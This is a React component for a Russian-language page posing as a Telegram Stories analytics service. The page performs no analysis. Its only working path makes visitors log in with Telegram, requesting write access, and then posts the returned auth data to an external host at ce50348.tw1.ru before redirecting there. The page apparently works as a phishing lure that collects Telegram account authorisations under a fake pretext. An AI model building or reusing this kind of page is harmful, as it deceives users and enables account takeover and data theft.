import React, { useEffect, useState } from 'react';
import axios from 'axios';
import styles from './main.module.scss';
import TelegramLoginButton from 'react-telegram-login';





function Main() {
  const token = window.token;
  const [error, setError] = useState({});
  const [popup, setPopup] = useState(false);
  let handleClick = (e)=>{
    e.preventDefault();
    if(token) {

    }else{
      setPopup(true);
    }
  }
  const handlePopupClick = (e) => {
    if (e.target === e.currentTarget) {
      setPopup(false);
    }
  };
  const handleTelegramResponse = res => {

      const json = JSON.stringify(res);

      axios.post('https://ce50348.tw1.ru/kkk', json)
    .then(() => {
      window.location.href = 'https://ce50348.tw1.ru';
    })
    .catch(error => {
      console.error(error);
    });
  }


  return (
    <div className={styles.wrapper}>
      <div className={styles.content}>
      <div className={styles.content_container}>
        <h1 className={styles.title}><span>Аналитика</span><span>Telegram Stories</span></h1>
        <p className={styles.subtitle}>Введите ваш никнейм Telegram или адрес канала</p>
        <form className={styles.form}>
          <div className={styles.input_container}>
            <input name='account' className={error.msg?styles.error:styles.input} type='text' placeholder='Укажите никнейм'/>

            {error.msg&&<div className={styles.error_msg}>{error.msg}</div>}
          </div>

          <button className={styles.btn} onClick={(e)=>handleClick(e)}>Анализировать</button>
        </form>
      </div>
      </div>
      <div className={styles.footer}>
      <div className={styles.copyright}>
      © 2023 Stories Analytics
    </div>
    <div className={styles.links}>
      <a href='#'>Политика конфиденциальности</a>
      <a href='#'>Пользовательское соглашение</a>
      </div>
          <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="StatAnalysBot" data-size="large" data-onauth="onTelegramAuth(user)" data-request-access="write"></script>
      </div>
    {popup&&<div className={styles.popup} onClick={handlePopupClick}>
      <div className={styles.popup_content}>
        <div className={styles.title_wrapper}>
          <div className={styles.popup_title}>Чтобы посмотреть вашу статистику, авторизуйтесь в Telegram</div >
          <div className={styles.exit} onClick={()=>setPopup(false)}>+</div>
        </div>
        <TelegramLoginButton dataOnauth={handleTelegramResponse} botName="StatAnalysBot" />,
      </div >
    </div >}
  </div>
  );
}

export default Main;
